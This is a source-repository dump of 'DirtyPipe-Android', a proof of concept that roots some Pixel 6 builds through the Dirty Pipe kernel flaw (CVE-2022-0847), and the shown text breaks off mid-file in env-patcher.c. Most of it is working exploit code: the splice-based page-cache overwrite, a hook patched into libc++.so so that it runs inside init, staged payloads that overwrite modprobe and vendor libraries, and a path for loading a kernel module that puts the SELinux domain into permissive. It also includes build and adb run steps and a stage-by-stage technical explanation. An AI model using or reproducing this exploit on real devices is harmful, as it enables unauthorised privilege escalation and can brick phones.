Project Path: arc_polygraphene_DirtyPipe-Android_48vhy_5e

Source Tree:

```txt
arc_polygraphene_DirtyPipe-Android_48vhy_5e
├── Makefile
├── README.md
├── TECHNICAL-DETAILS.md
├── dirtypipe-android.c
├── elf-parser.c
├── env-patcher.c
├── include.inc
├── magisk
│   ├── Magisk-v24.3.apk
│   ├── boot_patch.sh
│   ├── busybox
│   ├── magisk
│   ├── magiskboot
│   ├── magiskinit
│   └── util_functions.sh
├── modprobe-payload.c
├── mymod
│   ├── Makefile
│   ├── build-script-patch.patch
│   └── mymod.c
├── mymod-permissive.ko
├── mymod.ko
├── release.sh
├── run.bat
├── run.sh
├── screenshot1.png
├── stage1.S
├── stage2-c.c
├── stage2-payload-include.S
├── stage2.S
├── stage2.lds
└── startup-root

```

`Makefile`:

```
CC=aarch64-linux-android31-clang
CXX=aarch64-linux-android31-clang++
STRIP=llvm-strip
CFLAGS=-O2 $(CPPFLAGS)
ADB=adb
MYMOD_COPY=../../p6/kernel/out/android-gs-pixel-5.10/dist/mymod.ko
D=/data/local/tmp
OBJS=dirtypipe-android.o elf-parser.o stage1.o stage2-payload-include.S
VERSION=1.0.4

build: dirtypipe-android mymod.ko env-patcher

dirtypipe-android: $(OBJS) Makefile stage2-payload
	$(CC) $(CFLAGS) -Wall -o $@ $(OBJS)

dirtypipe-android.o: dirtypipe-android.c Makefile stage2-symbol.h
	$(CC) $(CFLAGS) -Os -c -o $@ $<

elf-parser.o: elf-parser.c Makefile
	$(CC) $(CFLAGS) -Os -c -o $@ $<

stage1.o: stage1.S Makefile include.inc
	$(CC) $(CPPFLAGS) -c -o $@ $<

stage2.o: stage2.S Makefile include.inc
	$(CC) $(CPPFLAGS) -nostdlib -c -o $@ $<

stage2-c.o: stage2-c.c Makefile
	$(CC) $(CPPFLAGS) -Os -nostdlib -c -o $@ $<

stage2: stage2-c.o stage2.o stage2.lds Makefile
	$(CC) $(CPPFLAGS) -T stage2.lds -nostdlib -nostartfiles -static -o $@ stage2-c.o stage2.o

# Must be smaller than 4096 bytes
stage2.text: stage2 Makefile
	aarch64-linux-gnu-objcopy -O binary -j .text $< $@

stage2-symbol.h: stage2 Makefile
	echo -n "unsigned long stage2_libname_addr = 0x" > $@
	(nm $< | grep -e ' T libname'$ | cut -f 1 -d " " | tr -d $$'\n'; echo "UL - 0x2000UL;") >> $@ || (rm $@; false)
	echo -n "unsigned long stage2_root_cmd_addr = 0x" >> $@
	(nm $< | grep -e ' T root_cmd'$ | cut -f 1 -d " " | tr -d $$'\n'; echo "UL - 0x2000UL;") >> $@ || (rm $@; false)

# Must be smaller than 4096 bytes
modprobe-payload: modprobe-payload.c Makefile
	$(CC) $(CPPFLAGS) -Os -nostartfiles -o $@ $< -llog
	$(STRIP) $@

mymod.ko: $(MYMOD_COPY)
	cp $(MYMOD_COPY) mymod.ko

# Page 1: stage2.text (Up to 1 page)
# Page 2: modprobe-payload (Up to 1 page)
# Page 3-6: mymod.ko (Up to 4 page)
stage2-payload: stage2.text modprobe-payload mymod.ko Makefile
	test -z "$$(find stage2.text -size +4096c)"
	test -z "$$(find modprobe-payload -size +4096c)"
	test -z "$$(find mymod.ko -size +16384c)"
	cp stage2.text $@
	truncate -s 4096 $@
	cat modprobe-payload >> $@
	truncate -s $(shell echo $$(( 4096 * 2 ))) $@
	cat mymod.ko >> $@
	truncate -s $(shell echo $$(( 4096 * 6 ))) $@

stage2-payload-include.o: stage2-payload-include.S stage2-payload Makefile
	$(CC) -c -o $@ $<

env-patcher: env-patcher.c Makefile
	$(CC) -o $@ $<

clean:
	-rm dirtypipe-android.o elf-parser.o stage1.o stage2-payload dirtypipe-android
	-rm stage2.text stage2 stage2-c.o stage2.o
	-rm stage2-symbol.h
	-rm modprobe-payload

### INSTALL ###

install: dirtypipe-android startup-root env-patcher
	$(ADB) push dirtypipe-android startup-root magisk/ env-patcher $(D)
	$(ADB) shell chmod 755 $(D)/dirtypipe-android $(D)/startup-root $(D)/magisk/busybox $(D)/magisk/magiskinit $(D)/env-patcher

run: install
	$(ADB) shell $(D)/dirtypipe-android

release: build
	./release.sh $(VERSION)


```

`README.md`:

```md
# DirtyPipe for Android
Dirty Pipe (CVE-2022-0847) temporary root PoC for Android.

# Targets
Currently only run on Pixel 6 with security patch level from 2022-02-05 to 2022-04-05.
Don't use on other devices or other versions. It must crash (reboot).

Dirty Pipe is finally patched on 2022 May security update on Pixel 6.

There is a port to Realme GT2 Pro by @rapperskull (https://github.com/polygraphene/DirtyPipe-Android/issues/12). [link](https://forum.xda-developers.com/t/eu-model-unlock-bootloader-of-european-model.4454787/)

Certain version of Galaxy S22 is also vulnerable. But not ported yet. (https://github.com/polygraphene/DirtyPipe-Android/issues/3)

# WARNING
There is possiblity to brick your phone by using this tool. Use it at your own risk.
Especially, don't update/install magisk from magisk app. It will cause permanent brick.

# How to use
1. Download binary from release page.
2. Setup adb (android platform tools).
3. Launch run.bat (For Windows) or run.sh (For Linux/Mac)
    - If you get `'adb' is not recognized ...` errors, check to add adb to PATH.
4. Wait several seconds (~30s) until Magisk app is automatically installed.
5. Run `adb shell` then `/dev/.magisk/su` (Or simply `su`) to get root shell.

![Screenshot](/screenshot1.png)

# About Magisk
1. Don't use install button on magisk app. It will brick your phone.
2. Don't reboot even if magisk app request. It will lose temporary root.
3. Only support root access. No magisk/zygisk modules support.

# How to build
1. Install Android NDK
2. Set PATH for aarch64-linux-android31-clang
```
export PATH=$PATH:$ANDROID_NDK/toolchains/llvm/prebuilt/linux-x86_64/bin
```
3. Run make
```
$ make
```

# How to build kernel module
1. Download Pixel 6 kernel source. [Link](https://source.android.com/setup/build/building-kernels)
2. Put mymod directory on kernel/private/google-modules/
3. Apply mymod/build-script-patch.patch to kernel/private/gs-google
4. Run build script

```
# For the first build
$ LTO=thin ./build/build.sh
# For faster rebuild (skip full rebuild)
$ SKIP_MRPROPER=1 SKIP_DEFCONFIG=1 LTO=thin ./build/build.sh
```

# Technical details
See [here](TECHNICAL-DETAILS.md)

# Future work
- ~~Stop using insecure telnet~~
- Make apk
- ~~Install Magisk~~
- Add device support

# Credits
- https://dirtypipe.cm4all.com/
- https://github.com/topjohnwu/Magisk
- https://github.com/j4nn/CVE-2020-0041/blob/v50g8-mroot/scripts/magisk-start.sh


```

`TECHNICAL-DETAILS.md`:

```md
# Prior knowledge
1. Dirty Pipe (CVE-2022-0847) can overwrite readable files.
2. Can't overwrite first byte of each page (each 4096 byte)

# Basic idea
- On Android, there is neither /etc/passwd nor suid. Futhermore we are monitored by SELinux for every operations on the system.
    - But we can read (and overwrite) system libraries (/system/lib/lib\*.so) by any process.
    - init process load many system libraries (dynamically linked on modern Android).
    - init process can read (and overwrite) more files than app process.
    - Use dirtypipe multiple times to load kernel module we tailored.

# Exploit process
- This exploit comprises following stages.
    1. Hook init process
    2. Rewrite /vendor/bin/modprobe and vendor library.
    3. fork()/execve() into /vendor/bin/modprobe.
    4. Load kernel module to disable selinux.

- Stage1
  1. Overwrite `/system/lib64/libc++.so` which is used by init.
    - Hook the function `_ZNSt3__115basic_streambufIcNS_11char_traitsIcEEEC2Ev (std::__1::basic_streambuf<char, std::__1::char_traits<char> >::basic_streambuf())`
    - We can trigger that function by running `setprop` command.

  2. Send next stage payload via `/system/lib/libldacBT_enc.so`.
    - `libc++` has very limited space.
    - 32bit `libldacBT_enc.so` should not be used so frequently, right?

  3. Payload in `libc++` `mmap`s `libldacBT_enc.so` for stage2 payload.

- Stage2
  1. We now in init process!

  2. Overwrite `/vendor/bin/modprobe` with modprobe-payload
      - modprobe has the privilege to load kernel module

  3. Overwrite `/vendor/lib/libstagefright_soft_mp3dec.so` with content of kernel module (mymod.ko)
      - modprobe can load kernel module from vendor_file context.
      - I have chosen this library because it has the same content as mymod.ko at offset=4096 which cannot be overwritten by dirtypipe.

  4. Transition to `vendor_modprobe` context then fork()/execve(`/vendor/bin/modprobe`)

- vendor\_modprobe (modprobe-payload)
  1. open(`/vendor/lib/libstagefright_soft_mp3dec.so`)
      - The file content was replaced to mymod.ko

  2. finit\_module(mymod.ko)
      - mymod.ko sets selinux domain of calling process to permissive.

  3. Run `startup-root` script
      - root with permissive domain.

# Information
```
$ sesearch --allow policy-dump|grep module_load
allow init-insmod-sh vendor_kernel_modules:system module_load;
allow ueventd vendor_file:system module_load;
allow vendor_modprobe vendor_file:system module_load;

-rw-r--r-- 1 root root  u:object_r:system_lib_file:s0     43168 2009-01-01 09:00 /system/lib/libldacBT_enc.so
-rw-r--r-- 1 root root  u:object_r:system_lib_file:s0    700392 2009-01-01 09:00 /system/lib64/libc++.so
-rw-r--r-- 1 root root  u:object_r:vendor_file:s0         71068 2009-01-01 09:00 /vendor/lib/libstagefright_soft_mp3dec.so
lrwxr-xr-x 1 root shell u:object_r:vendor_file:s0             7 2009-01-01 09:00 /vendor/bin/modprobe -> toolbox
```

- `finit_module` can load `vendor_kernel_modules` or `vendor_file`. Both are not readable by adb shell or non-system app. So kernel module must be prepared by other selinux contexts. `init` context can be used for that (stage1 payload).

- init-insmod-sh and ueventd should also available for this technique. (Not yet implemented/tested)

# How to add device support
- This method has device dependency by the following points:
    - Function offset in libc++.so
    - Empty space size in libc++.so
    - Availability of `/vendor/bin/modprobe`
    - Availability of `/vendor/lib/libstagefright_soft_mp3dec.so`
        - It must match the content of mymod.ko
    - Build kernel module for specific devices.



```

`dirtypipe-android.c`:

```c
/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <ctype.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/system_properties.h>
#include <errno.h>

#include "stage2-symbol.h"

extern char stage1_start[];
extern char stage1_data[];
extern uint32_t stage1_len;
extern char stage1_filename[];
extern char stage1_stage2_libname[];
extern char stage1_first_inst_copy[];

#define STAGE1_STAGE2_LIBNAME_LEN 64

#define STAGE2_PAGES (1 + 1 + 4)
extern char stage2_payload[];

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

int find_hook_target(const char *libcxx, uint64_t *hook_target, uint64_t *payload_target
		, uint32_t* first_instruction);

/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
	if (pipe(p)) abort();

	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[4096];

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}

	/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}

	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}

int overwrite(int p[2], int fd, loff_t offset, const char *data, int data_size) {
	if (offset % PAGE_SIZE == 0) {
		fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
		return EXIT_FAILURE;
	}

	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
	const loff_t end_offset = offset + (loff_t)data_size;
	if (end_offset > next_page) {
		fprintf(stderr, "Sorry, cannot write across a page boundary\n");
		return EXIT_FAILURE;
	}

	if(lseek64(fd, 0, SEEK_SET) < 0){
		perror("lseek64");
		return EXIT_FAILURE;
	}

	/* splice one byte from before the specified offset into the
	   pipe; this will add a reference to the page cache, but
	   since copy_page_to_iter_pipe() does not initialize the
	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
	--offset;
	loff_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		perror("splice failed");
		return EXIT_FAILURE;
	}
	if (nbytes == 0) {
		fprintf(stderr, "short splice\n");
		return EXIT_FAILURE;
	}

	/* the following write will not create a new pipe_buffer, but
	   will instead write into the page cache, because of the
	   PIPE_BUF_FLAG_CAN_MERGE flag */
	nbytes = write(p[1], data, data_size);
	if (nbytes < 0) {
		perror("write failed");
		return EXIT_FAILURE;
	}
	if ((size_t)nbytes < data_size) {
		fprintf(stderr, "short write\n");
		return EXIT_FAILURE;
	}
	return 0;
}

int load_run_index(const char *base_dir) {
	char run_index_path[500];
	int run_index = 0;

	sprintf(run_index_path, "%s/dirtypipe-run-index", base_dir);

	int fd = open(run_index_path, O_RDONLY);
	if(fd >= 0){
		char buf[100];
		read(fd, buf, sizeof(buf) - 1);
		close(fd);

		buf[sizeof(buf) - 1] = 0;
		run_index = atoi(buf);
	}

	if(run_index < 0 || 9999 <= run_index){
		run_index = 0;
	}

	fd = open(run_index_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if(fd >= 0){
		char buf[100];
		sprintf(buf, "%d", run_index + 1);
		write(fd, buf, strlen(buf));
		close(fd);
	}

	return run_index;
}

/*
This function is called in /system/bin/init when run setprop command.

Pixel 6 2022-02-05
$ llvm-objdump -TC libc++.so
000000000005a9dc  w   DF .text  0000000000000040 std::__1::basic_streambuf<char, std::__1::char_traits<char> >::basic_streambuf()

Mangled: _ZNSt3__115basic_streambufIcNS_11char_traitsIcEEEC2Ev
*/

void sighandler_empty(int a){}

int main(int argc, char **argv)
{
	const char *stage1_lib = "/system/lib64/libc++.so";
	const char *stage2_lib = "/system/lib/libldacBT_enc.so";
	const char *stage2_param_libname = NULL;
	size_t data_size;
	uint64_t shellcode_offset = 0;
	uint64_t hook_offset = 0;
	uint32_t first_instruction = 0;

	char product[PROP_VALUE_MAX] = {};
	char fingerprint[PROP_VALUE_MAX] = {};
	__system_property_get("ro.build.product", product);
	__system_property_get("ro.build.fingerprint", fingerprint);

	if(argc >= 2 && strcmp(argv[1], "-f") == 0){
		printf("Ignore device info.\n");
		if(argc >= 3){
			stage2_param_libname = argv[2];
		}else{
			stage2_param_libname = "/vendor/lib/libstagefright_soft_mp3dec.so";
		}
		if(argc >= 4){
			stage2_lib = argv[3];
		}
	}else{
		if(strcmp(product, "oriole") == 0){
			if(strcmp(fingerprint, "google/oriole/oriole:12/SQ1D.220205.004/8151327:user/release-keys") == 0){
				// Pixel 6 2022-02-05
				stage2_param_libname = "/vendor/lib/libstagefright_soft_mp3dec.so";
			}else if(strcmp(fingerprint, "google/oriole/oriole:12/SP2A.220305.013.A3/8229987:user/release-keys") == 0){
				// Pixel 6 2022-03-05
				stage2_param_libname = "/vendor/lib/libstagefright_soft_mp3dec.so";
			}else if(strcmp(fingerprint, "google/oriole/oriole:12/SP2A.220405.004/8233519:user/release-keys") == 0){
				// Pixel 6 2022-04-05
				stage2_param_libname = "/vendor/lib/libstagefright_soft_mp3dec.so";
			}else{
				fprintf(stderr, "Unsupported version: Product=%s Fingerprint=%s\n", product, fingerprint);
				return EXIT_FAILURE;
			}
		}else{
			fprintf(stderr, "Unsupported product: Product=%s Fingerprint=%s\n", product, fingerprint);
			return EXIT_FAILURE;
		}
	}
	printf("Device version: Product=%s Fingerprint=%s\n", product, fingerprint);
	printf("stage1_lib: %s\n", stage1_lib);
	printf("stage2_lib: %s\n", stage2_lib);
	printf("stage2_param_libname: %s\n", stage2_param_libname);
	if(strlen(stage2_lib) >= STAGE1_STAGE2_LIBNAME_LEN){
		fprintf(stderr, "Too long stage2_lib\n");
		return EXIT_FAILURE;
	}

	if(find_hook_target(stage1_lib, &hook_offset, &shellcode_offset, &first_instruction)){
		fprintf(stderr, "Could not find hook target and shellcode offset from libc++.so\n");
		return EXIT_FAILURE;
	}
	printf("Offset found: shellcode_offset: %lx hook_offset: %lx first instruction: %08x\n", shellcode_offset, hook_offset, first_instruction);

	uint64_t empty_space = (PAGE_SIZE - (shellcode_offset % PAGE_SIZE)) % PAGE_SIZE;
	printf("Empty space size: %ld bytes\n", empty_space);

	if(stage1_len > empty_space){
		fprintf(stderr, "Stage1 payload (%d bytes) is too large. Exit.\n", stage1_len);
		return EXIT_FAILURE;
	}

	char base_dir[256] = {};
	readlink("/proc/self/exe", base_dir, sizeof(base_dir) - 1);
	*strrchr(base_dir, '/') = 0;
	int run_index = load_run_index(base_dir);

	printf("Run index: %d\n", run_index);

	// Shellcode is placed in empty space on .text
	// Max size=544 bytes
	//size_t shellcode_offset = 0x000a2de0UL;
	//size_t hook_offset      = 0x0005a9dcUL;

	// Aarch64 branch
	const uint32_t BRANCH = 0x14000000;

	// Build branch instruction for first instruction of hook target.
	uint32_t hook_data = BRANCH;
	uint32_t start_offset = (char*)stage1_start - (char*)stage1_data;
	hook_data |= (shellcode_offset + start_offset - hook_offset) >> 2;
	int hook_data_size = 4;

	sprintf(stage1_filename, "/dev/.dirtypipe-%04d", run_index);
	printf("Stage1 debug filename: %s\n", stage1_filename);
	strcpy(stage1_stage2_libname, stage2_lib);

	// Jump back to hook target + 4.
	uint32_t jmpback = BRANCH;
	jmpback |= (((hook_offset + 4) - (shellcode_offset + stage1_len - 4)) >> 2) & 0x3ffffff;
	*(uint32_t *)&stage1_data[stage1_len - 4] = jmpback;

	*(uint32_t *)&stage1_first_inst_copy[0] = first_instruction;

	printf("Shell code size: %d 0x%x bytes\n", stage1_len, stage1_len);

	// Embed stage2 libname
	int libname_len = strlen(stage2_param_libname);
	if(libname_len >= 128 - 1){
		fprintf(stderr, "Too long libname: %s\n", stage2_param_libname);
		return EXIT_FAILURE;
	}
	memcpy(stage2_payload + stage2_libname_addr, stage2_param_libname, libname_len + 1);

	// Embed the path of root startup script.
	char root_cmd[500];
	strcpy(root_cmd, base_dir);
	strcat(root_cmd, "/startup-root");
	if(strlen(root_cmd) >= 128 - 1){
		fprintf(stderr, "Too long root_cmd: %s\n", root_cmd);
		return EXIT_FAILURE;
	}
	memcpy(stage2_payload + stage2_root_cmd_addr, root_cmd, strlen(root_cmd) + 1);
	printf("startup script: %s\n", root_cmd);
	chmod(root_cmd, 0755);

	int fd2 = open(stage2_lib, O_RDONLY); // yes, read-only! :-)
	if (fd2 < 0) {
		perror("open failed");
		return EXIT_FAILURE;
	}

	/* open the input file and validate the specified offset */
	int fd1 = open(stage1_lib, O_RDONLY); // yes, read-only! :-)
	if (fd1 < 0) {
		perror("open failed");
		return EXIT_FAILURE;
	}

	// Backup original content.
	char *stage2_backup = (char *)malloc(STAGE2_PAGES * PAGE_SIZE);
	if(read(fd2, stage2_backup, STAGE2_PAGES * PAGE_SIZE) < 0){
		perror("read backup stage2");
	}
	char *stage1_backup = (char *)malloc(stage1_len);
	if(lseek64(fd1, shellcode_offset, SEEK_SET) < 0){
		perror("lseek64");
	}
	if(read(fd1, stage1_backup, stage1_len) < 0){
		perror("read backup stage1");
	}

	/* create the pipe with all flags initialized with
	   PIPE_BUF_FLAG_CAN_MERGE */
	int p[2];
	prepare_pipe(p);

	// Send stage2 first.
	for(int i = 0; i < STAGE2_PAGES; i++){
		overwrite(p, fd2, i * PAGE_SIZE + 1, stage2_payload + i * PAGE_SIZE + 1, PAGE_SIZE - 1);
	}
	// Send stage1
	overwrite(p, fd1, shellcode_offset, stage1_data, stage1_len);
	overwrite(p, fd1, hook_offset, (char*)&hook_data, hook_data_size);

	// Trigger
	system("setprop a a");

	signal(SIGCHLD, SIG_IGN);

	if(fork() == 0){
		// Disconnect child from adb shell.
		setsid();
		close(0);
		close(1);
		close(2);

		signal(SIGHUP, SIG_IGN);
		// The default action of SIGUSR1 is termination of process. We don't like it.
		signal(SIGUSR1, sighandler_empty);

		// SIGUSR1 will be sent by startup-script to notify completion of exploit
		sigset_t set;
		sigemptyset(&set);
		sigaddset(&set, SIGHUP);
		sigaddset(&set, SIGINT);
		sigaddset(&set, SIGTERM);
		sigaddset(&set, SIGKILL);
		sigaddset(&set, SIGUSR1);
		int sig;
		int ret = sigwait(&set, &sig);

		// Restore stage1
		overwrite(p, fd1, hook_offset, (char*)&first_instruction, hook_data_size);
		overwrite(p, fd1, shellcode_offset, stage1_backup, stage1_len);
		// Restore stage2
		for(int i = 0; i < STAGE2_PAGES; i++){
			overwrite(p, fd2, i * PAGE_SIZE + 1, stage2_backup + i * PAGE_SIZE + 1, PAGE_SIZE - 1);
		}

		exit(0);
	}

	printf("It worked!\n");

	return EXIT_SUCCESS;
}

```

`elf-parser.c`:

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/elf.h>

int find_hook_target(const char *libcxx, uint64_t *hook_target, uint64_t *payload_target, uint32_t* first_instruction) {
	Elf64_Ehdr hdr;

	*hook_target = 0;
	*payload_target = 0;

	int fd = open(libcxx, O_RDONLY);
	if(fd < 0){
		perror("open libc++.so");
		return 1;
	}
	if(read(fd, (char *)&hdr, sizeof(hdr)) < sizeof(hdr)){
		perror("read libc++.so");
		close(fd);
		return 1;
	}
	if(strncmp((char *)hdr.e_ident, "\x7f""ELF", 4) != 0){
		fprintf(stderr, "Invalid elf file: %s\n", libcxx);
		close(fd);
		return 1;
	}
	//printf("libc++.so Program header: %x %x %x\n", hdr.e_phoff, hdr.e_phnum, hdr.e_phentsize);
	if(lseek64(fd, hdr.e_phoff, SEEK_SET) < 0){
		perror("lseek64 e_phoff");
		close(fd);
		return 1;
	}
	if(hdr.e_phentsize != sizeof(Elf64_Phdr)) {
		fprintf(stderr, "Invalid program header size: %d\n", hdr.e_phentsize);
		close(fd);
		return 1;
	}
	for(int i = 0; i < hdr.e_phnum; i++){
		Elf64_Phdr phdr;
		if(read(fd, (char *)&phdr, sizeof(phdr)) < 0){
			perror("read phdr");
			close(fd);
			return 1;
		}

		if(phdr.p_type == PT_LOAD){
			if(phdr.p_flags & PF_X){
				*payload_target = phdr.p_offset + phdr.p_filesz;
			}
		}
	}
	if(lseek64(fd, hdr.e_shoff + hdr.e_shstrndx * sizeof(Elf64_Shdr), SEEK_SET) < 0){
		perror("lseek64 shdr");
		close(fd);
		return 1;
	}
	Elf64_Shdr str_shdr;
	if(read(fd, (char *)&str_shdr, sizeof(str_shdr)) < 0){
		perror("read shdr");
		close(fd);
		return 1;
	}
	uint64_t dynstr = 0;
	uint64_t dynsym_offset = 0;
	uint64_t dynsym_size = 0;
	for(int i = 0; i < hdr.e_shnum; i++){
		Elf64_Shdr shdr;
		if(lseek64(fd, hdr.e_shoff + i * sizeof(Elf64_Shdr), SEEK_SET) < 0){
			perror("lseek64 shdr");
			close(fd);
			return 1;
		}
		if(read(fd, (char *)&shdr, sizeof(shdr)) < 0){
			perror("read shdr");
			close(fd);
			return 1;
		}
		if(lseek64(fd, shdr.sh_name + str_shdr.sh_offset, SEEK_SET) < 0){
			perror("lseek64 e_phoff");
			close(fd);
			return 1;
		}
		char name[100];
		if(read(fd, name, sizeof(name) - 1) < 0){
			perror("read sh_name");
			close(fd);
			return 1;
		}
		name[sizeof(name) - 1] = 0;
		if(strcmp(name, ".dynstr") == 0){
			dynstr = shdr.sh_offset;
		}
		if(strcmp(name, ".dynsym") == 0){
			dynsym_offset = shdr.sh_offset;
			dynsym_size = shdr.sh_size;
		}
		//printf("Section[%d] = %s\n", i, name);
	}

	if(dynstr == 0 || dynsym_offset == 0){
		fprintf(stderr, ".dynstr or .dynsym not found\n");
		close(fd);
		return 1;
	}
	for(int i = 0; i < dynsym_size / sizeof(Elf64_Sym); i++){
		Elf64_Sym sym;
		if(lseek64(fd, dynsym_offset + i * sizeof(Elf64_Sym), SEEK_SET) < 0){
			perror("lseek64 dynsym");
			close(fd);
			return 1;
		}
		if(read(fd, (char *)&sym, sizeof(sym)) < 0){
			perror("read dynsym");
			close(fd);
			return 1;
		}
		if(lseek64(fd, dynstr + sym.st_name, SEEK_SET) < 0){
			perror("lseek64 st_name");
			close(fd);
			return 1;
		}
		char name[200];
		if(read(fd, name, sizeof(name) - 1) < 0){
			perror("read st_name");
			close(fd);
			return 1;
		}
		name[sizeof(name) - 1] = 0;
		if(strcmp(name, "_ZNSt3__115basic_streambufIcNS_11char_traitsIcEEEC2Ev") == 0){
			*hook_target = sym.st_value;
		}
		//printf("Dymsym[%d] = %s\n", i, name);
	}
	if(*hook_target == 0){
		fprintf(stderr, "Could not find symbol name for hook target.\n");
		close(fd);
		return 1;
	}
	// Extract first instruction
	if(lseek64(fd, *hook_target, SEEK_SET) < 0){
		perror("lseek64 hook_target");
		close(fd);
		return 1;
	}
	if(read(fd, first_instruction, sizeof(*first_instruction)) < 0){
		perror("read first instruction");
		close(fd);
		return 1;
	}
	if(*first_instruction == 0xd503233fU){
		// Hook next instruction if PACIASP is detected.
		printf("d503233f PACIASP was found. Offset hook address by +4.\n");
		*hook_target += 4UL;

		if(read(fd, first_instruction, sizeof(*first_instruction)) < 0){
			perror("read first instruction");
			close(fd);
			return 1;
		}
	}

	close(fd);
	return 0;
}

```

`env-patcher.c`:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <sys/types.h>
#include <dirent.h>
#include <linux/elf.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>
#include <elf.h>

// Patching PATH for su in running process.
// Target: init, zygote, zygote64, adbd

#define LIB32 "/apex/com.android.runtime/lib/bionic/libc.so"
#define LIB64 "/apex/com.android.runtime/lib64/bionic/libc.so"
#define LIBINIT64 "/system/lib64/bootstrap/libc.so"

typedef uint64_t u64;
typedef uint32_t u32;

struct gnu_hash {
	u32 nbuckets;
	u32 symoffset;
	u32 bloom_size;
	u32 bloom_shift;
};

int readbuf(int fd, u64 addr, void *buf, int len){
	if(lseek64(fd, addr, SEEK_SET) < 0){
		return -1;
	}
	if(read(fd, buf, len) < len){
		return -1;
	}
	return 0;
}

int writebuf(int fd, u64 addr, void *buf, int len){
	if(lseek64(fd, addr, SEEK_SET) < 0){
		return -1;
	}
	if(write(fd, buf, len) < len){
		return -1;
	}
	return 0;
}

int get_environ_addr(int fd, bool is64, u64 base, u64 *addr){
	if(is64){
		Elf64_Ehdr hdr;
		if(readbuf(fd, base, &hdr, sizeof(hdr))){
			return -1;
		}

		u64 dyn_off = 0;
		u64 dyn_size = 0;
		for(int i = 0; i < hdr.e_phnum; i++){
			Elf64_Phdr phdr;
			if(readbuf(fd, base + hdr.e_phoff + sizeof(Elf64_Phdr) * i, &phdr, sizeof(phdr))){
				return -1;
			}

			if(phdr.p_type == PT_DYNAMIC){
				dyn_off = phdr.p_vaddr;
				dyn_size = phdr.p_memsz;
			}
		}

		u64 strtab = 0;
		u64 symtab = 0;
		u64 gnu_hash = 0;
		int dyn_count = dyn_size / sizeof(Elf64_Dyn);
		for(int i = 0; i < dyn_count; i++){
			Elf64_Dyn dyn;
			if(readbuf(fd, base + dyn_off + sizeof(Elf64_Dyn) * i, &dyn, sizeof(dyn))){
				return -1;
			}

			if(dyn.d_tag == DT_STRTAB){
				strtab = dyn.d_un.d_val;
			}
			if(dyn.d_tag == DT_SYMTAB){
				symtab = dyn.d_un.d_ptr;
			}
			if(dyn.d_tag == DT_GNU_HASH){
				gnu_hash = dyn.d_un.d_ptr;
			}
		}

		// Get symbol count from DT_GNU_HASH

		struct gnu_hash gnu_hash_obj;
		if(readbuf(fd, base + gnu_hash, &gnu_hash_obj, sizeof(gnu_hash_obj))){
			return -1;
		}
		u64 bucket_offset = base + gnu_hash + sizeof(gnu_hash_obj) + sizeof(u64) * gnu_hash_obj.bloom_size;
		u64 chain_offset = bucket_offset + sizeof(u32) * gnu_hash_obj.nbuckets;
		u32 last_bucket;
		if(readbuf(fd, bucket_offset + sizeof(u32) * (gnu_hash_obj.nbuckets - 1), &last_bucket, sizeof(last_bucket))){
			return -1;
		}
		//printf("nbu: %d symoffset: %d  %d,%d  last:%d\n", gnu_hash_obj.nbuckets, gnu_hash_obj.symoffset, gnu_hash_obj.bloom_size, gnu_hash_obj.bloom_shift, last_bucket);
		u64 symcount = 0;

		for(int i = 0;; i++){
			u32 last_sym = 0;
			if(readbuf(fd, chain_offset + sizeof(u32) * (last_bucket - gnu_hash_obj.symoffset + i), &last_sym, sizeof(last_sym))){
				return -1;
			}
			//printf("%d: %08x\n", i, last_sym);
			if(last_sym & 1){
				// last sym
				symcount = last_bucket + i + 1;
				break;
			}
		}

		// Linear search for dynamic symbols

		fprintf(stderr, "Symbol count: %lu\n", symcount);
		for(int i = 0; i < symcount; i++){
			Elf64_Sym sym;
			if(readbuf(fd, base + symtab + i * sizeof(Elf64_Sym), &sym, sizeof(sym))){
				return -1;
			}
			char name[100] = {};
			if(readbuf(fd, base + sym.st_name + strtab, name, sizeof(name) - 1)){
				return -1;
			}
			//printf("name[%d]: %s\n", i, name);
			if(strcmp(name, "environ") == 0){
				*addr = sym.st_value;
				return 0;
			}
		}
